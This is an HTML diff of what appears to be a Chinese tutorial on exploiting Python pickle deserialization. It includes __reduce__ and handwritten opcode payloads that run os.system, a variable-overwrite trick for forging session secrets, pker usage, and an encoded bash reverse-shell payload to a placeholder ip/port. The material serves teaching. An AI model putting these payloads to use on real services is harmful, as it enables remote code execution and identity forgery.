+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># 输出</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># b&#39;(cos\nsystem\nS\&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#34;\&#39;\no.&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># b&#39;KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMSInCm8u&#39;</span></span></span></code></pre></div><h1 id="用法" class="heading-element"><span>用法</span>
   <a href="#%e7%94%a8%e6%b3%95" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><blockquote>
+</h1><blockquote>
 <p>pickle.==dump==(obj, file[, protocol])
 　　序列化对象，并将结果数据流写入到文件对象中。参数protocol是序列化模式，默认值为0，表示以文本的形式序列化。protocol的值还可以是1或2，表示以二进制的形式序列化。</p>
 <p>pickle.==load==(file)
 　　反序列化对象。将文件中的数据解析为一个Python对象。</p>
 </blockquote>
 <p>此外其实还有<code>dumps</code>和<code>loads</code>，　dumps()只是单纯得将对象序列化，而dump()会在序列化之后将结果写入到文件当中；与之对应，loads()是对dumps的序列化结果进行反序列化，而dump()会从文件中读取内容进行反序列化。</p>
-<h6 id="序列化" class="heading-element"><span>0.0.0.4.1  序列化</span>
+<h2 id="序列化" class="heading-element"><span>序列化</span>
   <a href="#%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>序列化到二进制文件</p>
+</h2><p>序列化到二进制文件</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">pickle</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">...</span> <span style="color:#828b96;font-style:italic"># Some Python object</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">f</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">open</span>(<span style="color:#a6be9d">&#39;somefile&#39;</span>, <span style="color:#a6be9d">&#39;wb&#39;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dump</span>(<span style="color:#58a1dd">data</span>, <span style="color:#58a1dd">f</span>)</span></span></code></pre></div><p>序列化为字符串</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dumps</span>(<span style="color:#58a1dd">data</span>)</span></span></code></pre></div><h6 id="反序列化" class="heading-element"><span>0.0.0.4.2  反序列化</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dumps</span>(<span style="color:#58a1dd">data</span>)</span></span></code></pre></div><h2 id="反序列化" class="heading-element"><span>反序列化</span>
   <a href="#%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>为了从字节流中恢复一个对象，使用 <code>pickle.load()</code> 或 <code>pickle.loads()</code> 函数。</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### Restore from a file</span>
+</h2><p>为了从字节流中恢复一个对象，使用 <code>pickle.load()</code> 或 <code>pickle.loads()</code> 函数。</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Restore from a file</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">f</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">open</span>(<span style="color:#a6be9d">&#39;somefile&#39;</span>, <span style="color:#a6be9d">&#39;rb&#39;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">load</span>(<span style="color:#58a1dd">f</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### Restore from a string</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># Restore from a string</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">data</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">loads</span>(<span style="color:#58a1dd">s</span>)</span></span></code></pre></div><p>有些类型的对象是不能被序列化的。这些通常是那些依赖外部系统状态的对象， 比如<code>打开的文件</code>，<code>网络连接</code>，<code>线程</code>，<code>进程</code>，<code>栈帧</code>等等。 用户自定义类可以通过提供 <code>__getstate__()</code> 和 <code>__setstate__()</code> 方法来绕过这些限制。 如果定义了这两个方法，<code>pickle.dump()</code> 就会调用 <code>__getstate__()</code> 获取序列化的对象。 类似的，<code>__setstate__()</code> 在反序列化时被调用。</p>
 <p>为了演示这个工作原理， 下面是一个在内部定义了一个线程但仍然可以序列化和反序列化的类：</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">##### countdown.py</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic"># countdown.py</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">time</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">threading</span>
 </span></span><span style="display:flex;"><span>
@@ -645,23 +666,23 @@
 </span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">self</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">n</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#ff636f">def</span> <span style="color:#58a1dd">__setstate__</span>(<span style="color:#58a1dd">self</span>, <span style="color:#58a1dd">n</span>):
-</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">self</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span>(<span style="color:#58a1dd">n</span>)</span></span></code></pre></div><h5 id="漏洞利用" class="heading-element"><span>0.0.0.5  漏洞利用</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">self</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">__init__</span>(<span style="color:#58a1dd">n</span>)</span></span></code></pre></div><h1 id="漏洞利用" class="heading-element"><span>漏洞利用</span>
   <a href="#%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h5><h6 id="利用思路" class="heading-element"><span>0.0.0.5.1  利用思路</span>
+</h1><h2 id="利用思路" class="heading-element"><span>利用思路</span>
   <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><ul>
+</h2><ul>
 <li>任意代码执行或命令执行。</li>
 <li>变量覆盖，通过覆盖一些凭证达到绕过身份验证的目的。</li>
 </ul>
-<h6 id="初步认识pickle-exp的简单demo" class="heading-element"><span>0.0.0.5.2  初步认识：pickle EXP的简单demo</span>
+<h2 id="初步认识pickle-exp的简单demo" class="heading-element"><span>初步认识：pickle EXP的简单demo</span>
   <a href="#%e5%88%9d%e6%ad%a5%e8%ae%a4%e8%af%86pickle-exp%e7%9a%84%e7%ae%80%e5%8d%95demo" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">pickle</span>
+</h2><div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">pickle</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">os</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">class</span> <span style="color:#58a1dd">genpoc</span>(<span style="color:#58a1dd">object</span>):
@@ -688,11 +709,11 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">pickle_a</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">dumps</span>(<span style="color:#58a1dd">a</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">pickle_a</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">loads</span>(<span style="color:#58a1dd">pickle_a</span>)
-</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">key1</span>, <span style="color:#58a1dd">key2</span>)</span></span></code></pre></div><h6 id="命令执行" class="heading-element"><span>0.0.0.5.3  命令执行</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#58a1dd">key1</span>, <span style="color:#58a1dd">key2</span>)</span></span></code></pre></div><h2 id="命令执行" class="heading-element"><span>命令执行</span>
   <a href="#%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在上文我们已经提到了，我们可以通过在类中重写__reduce__方法，从而在反序列化时执行任意命令，但是通过这种方法一次只能执行一个命令，如果想一次执行多个命令，就只能通过手写opcode的方式了。</p>
+</h2><p>在上文我们已经提到了，我们可以通过在类中重写__reduce__方法，从而在反序列化时执行任意命令，但是通过这种方法一次只能执行一个命令，如果想一次执行多个命令，就只能通过手写opcode的方式了。</p>
 <p>在opcode中，<code>.</code>是程序结束的标志。我们可以通过去掉<code>.</code>来将两个字节流拼接起来</p>
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">pickle</span>
 </span></span><span style="display:flex;"><span> 
@@ -705,7 +726,7 @@
 </span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">tR.&#39;&#39;&#39;</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">pickle</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">loads</span>(<span style="color:#58a1dd">opcode</span>)
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####结果如下</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#结果如下</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">xiaoh</span>\<span style="color:#a6be9d">34946</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">xiaoh</span>\<span style="color:#a6be9d">34946</span></span></span></code></pre></div><p>当然，在pickle中，和函数执行的字节码有三个：<code>R</code>、<code>i</code>、<code>o</code>，所以我们可以从三个方向构造paylaod</p>
 <ul>
@@ -755,13 +776,13 @@
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#58a1dd">opcode3</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#39;&#39;&#39;(cos
 </span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">system
 </span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">S&#39;whoami&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">o.&#39;&#39;&#39;</span></span></span></code></pre></div><h6 id="变量覆盖" class="heading-element"><span>0.0.0.5.4  变量覆盖</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#a6be9d">o.&#39;&#39;&#39;</span></span></span></code></pre></div><h2 id="变量覆盖" class="heading-element"><span>变量覆盖</span>
   <a href="#%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>在session或token中，由于需要存储一些用户信息，所以我们常常能够看见pickle的身影。程序会将用户的各种信息序列化并存储在session或token中，以此来验证用户的身份。</p>
+</h2><p>在session或token中，由于需要存储一些用户信息，所以我们常常能够看见pickle的身影。程序会将用户的各种信息序列化并存储在session或token中，以此来验证用户的身份。</p>
 <p>假如session或token是以明文的方式进行存储的，我们就有可能通过变量覆盖的方式进行身份伪造。</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####secret.py</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#secret.py</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">secret</span><span style="color:#ff636f">=</span><span style="color:#a6be9d">&#34;This is a key&#34;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">pickle</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">secret</span>
@@ -777,14 +798,14 @@
 </span></span><span style="display:flex;"><span> 
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">print</span>(<span style="color:#a6be9d">&#34;secret变量的值为:&#34;</span><span style="color:#ff636f">+</span><span style="color:#58a1dd">fake</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">secret</span>)
 </span></span><span style="display:flex;"><span> 
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#######</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">###</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">secret变量的值为</span>:<span style="color:#58a1dd">This</span> <span style="color:#ff636f">is</span> <span style="color:#58a1dd">a</span> <span style="color:#58a1dd">key</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">secret变量的值为</span>:<span style="color:#58a1dd">Hack</span>!!!</span></span></code></pre></div><p>我们首先通过<code>c</code>来获取<code>__main__.secret</code>模块，然后将字符串<code>secret</code>和<code>Hack!!!</code>压入栈中，然后通过字节码<code>d</code>将两个字符串组合成字典<code>{'secret':'Hack!!!'}</code>的形式。由于在pickle中，反序列化后的数据会以key-value的形式存储，所以secret模块中的变量<code>secret=&quot;This is a key&quot;</code>，是以<code>{'secret':'This is a key'}</code>形式存储的。最后再通过字节码b来执行<code>__dict__.update()</code>，即<code>{'secret':'This is a key'}.update({'secret':'Hack!!!'})</code>，因此最终secret变量的值被覆盖成了<code>Hack!!!</code>。</p>
-<h6 id="pker" class="heading-element"><span>0.0.0.5.5  pker</span>
+<h2 id="pker" class="heading-element"><span>pker</span>
   <a href="#pker" class="heading-mark">
     <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
   </a>
-</h6><p>使用<a href="https://github.com/eddieivan01/pker"target="_blank" rel="external nofollow noopener noreferrer">pker</a>，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</p>
+</h2><p>使用<a href="https://github.com/eddieivan01/pker"target="_blank" rel="external nofollow noopener noreferrer">pker</a>，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</p>
 <p><a href="https://xz.aliyun.com/t/7012"target="_blank" rel="external nofollow noopener noreferrer">通过AST来构造Pickle opcode</a></p>
 <p><code>pker能做的事</code></p>
 <p>引用自https://xz.aliyun.com/t/7012#toc-5：</p>
@@ -805,7 +826,7 @@
 <div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff636f">return</span>           <span style="color:#ff636f">=&gt;</span>  <span style="color:#ff636f">.</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span> <span style="color:#58a1dd">var</span>       <span style="color:#ff636f">=&gt;</span>  <span style="color:#58a1dd">g_</span>\<span style="color:#58a1dd">n</span><span style="color:#ff636f">.</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span> <span style="color:#a6be9d">1</span>         <span style="color:#ff636f">=&gt;</span>  <span style="color:#58a1dd">I1</span>\<span style="color:#58a1dd">n</span><span style="color:#ff636f">.</span></span></span></code></pre></div><p>当然你也可以和Python的正常语法结合起来，下面是使用示例</p>
-<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####pker_test.py</span>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#pker_test.py</span>
 </span></span><span style="display:flex;"><span> 
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">i</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">0</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">s</span> <span style="color:#ff636f">=</span> <span style="color:#a6be9d">&#39;id&#39;</span>
@@ -815,33 +836,33 @@
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">system</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">GLOBAL</span>(<span style="color:#a6be9d">&#39;os&#39;</span>, <span style="color:#a6be9d">&#39;system&#39;</span>)
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">system</span>(<span style="color:#58a1dd">s</span>)
 </span></span><span style="display:flex;"><span><span style="color:#ff636f">return</span>
-</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#####命令行下</span>
+</span></span><span style="display:flex;"><span><span style="color:#828b96;font-style:italic">#命令行下</span>
 </span></span><span style="display:flex;"><span><span style="color:#58a1dd">python3</span> <span style="color:#58a1dd">pker</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">py</span> <span style="color:#ff636f">&lt;</span> <span style="color:#58a1dd">pker_tests</span><span style="color:#ff636f">.</span><span style="color:#58a1dd">py</span>
 </span></span><span style="display:flex;"><span> 
 </span></span><span style="display:flex;"><span><span style="color:#a6be9d">b</span><span style="color:#a6be9d">&#34;I0</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">p0</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">0S&#39;id&#39;</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">p1</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">0(g0</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">lp2</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">0(I0</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">tp3</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">0(g3</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">I0</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">dp4</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">0cos</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">system</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">p5</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">0g5</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">(g1</span><span style="color:#a6be9d">\n</span><span style="color:#a6be9d">tR.&#34;</span></span></span></code></pre></div><p>自动解析并生成了我们所需的opcode。</p>
-<h6 id="注意事项" class="heading-element"><span>0.0.0.5.6  注意事项</span>
+<h2 id="注意事项" class="heading-element"><span>注意事项</span>
   <a href="#%e6%b3%a8%e6%84%8f%e4%ba%8b%e9%a1%b9" class="heading-mark">
